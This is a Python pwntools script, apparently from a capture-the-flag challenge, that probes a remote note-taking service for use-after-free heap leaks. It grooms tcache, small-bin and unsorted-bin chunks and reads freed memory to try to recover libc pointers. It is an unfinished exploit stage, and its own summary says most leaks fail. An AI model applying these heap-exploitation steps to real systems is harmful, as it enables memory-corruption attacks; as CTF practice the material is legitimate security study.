#!/usr/bin/env python3
"""
Try to leak via stack/environment pointers
"""

from pwn import *

elf = ELF('./chal', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

context.log_level = 'info'

io = remote('amt.rs', 26797)

def create(idx, size, data):
    io.sendlineafter(b'operation: ', b'1')
    io.sendlineafter(b'note: ', str(idx).encode())
    io.sendlineafter(b'size: ', hex(size).encode())
    io.sendafter(b'data: ', data)

def delete(idx):
    io.sendlineafter(b'operation: ', b'2')
    io.sendlineafter(b'note: ', str(idx).encode())

def view(idx):
    io.sendlineafter(b'operation: ', b'3')
    io.sendlineafter(b'note: ', str(idx).encode())
    io.recvuntil(b'data: ')
    return io.recvline()

success("Testing different leak strategies")

# Strategy: Use very large allocations to potentially overlap with mmap regions
# Or use specific sizes that trigger different malloc behaviors

info("Test 1: Allocate in mmap region (>128KB)")
try:
    create(0, 0x21000, b'A' * 100)  # 132KB - goes to mmap
    data = view(0)
    info(f"Mmap chunk: {data[:30]}")
except Exception as e:
    warn(f"Mmap test failed: {e}")

info("Test 2: Allocate many small chunks to manipulate tcache")
for i in range(1, 10):
    create(i, 0x88, f"chunk{i}".encode().ljust(0x88, b'\x00'))

# Free them all
for i in range(1, 8):  # Fill tcache (max 7)
    delete(i)

# Now 8 and 9 will go to small bin when freed
delete(8)
delete(9)

# View freed small bin chunks
try:
    data = view(8)
    info(f"Small bin chunk: {data[:30]}")
except:
    pass

info("Test 3: Use UAF on large bin")
create(10, 0x500, b'B' * 0x500)
create(11, 0x500, b'C' * 0x500)
create(12, 0x20, b'guard')

delete(10)
delete(11)

# These go to unsorted bin, might have libc pointers
try:
    data10 = view(10)
    data11 = view(11)
    info(f"Unsorted 10: {data10[:30]}")
    info(f"Unsorted 11: {data11[:30]}")
except:
    pass

info("Test 4: Check what we can actually control")

# Create a chunk and fill it with recognizable pattern
pattern = cyclic(0x100)
create(13, 0x100, pattern)

delete(13)

try:
    data = view(13)
    info(f"After free: {data[:50]}")

    # Check if our pattern is still there
    if pattern[:10] in data:
        success("Pattern still visible after free!")
    elif b'(null)' in data:
        warn("Got (null) - pointer has null bytes")
    else:
        info(f"Got different data: {data[:20].hex()}")
except Exception as e:
    error(f"View failed: {e}")

# Print summary
info("=" * 60)
info("Summary of leak attempts")
info("=" * 60)
info("Most leaks return '(null)' due to null bytes in pointers")
info("GOT entries return libc code (we see endbr64 instructions)")
info("We know puts is at offset 0x8e640 but can't get actual address")
info("=" * 60)

io.interactive()
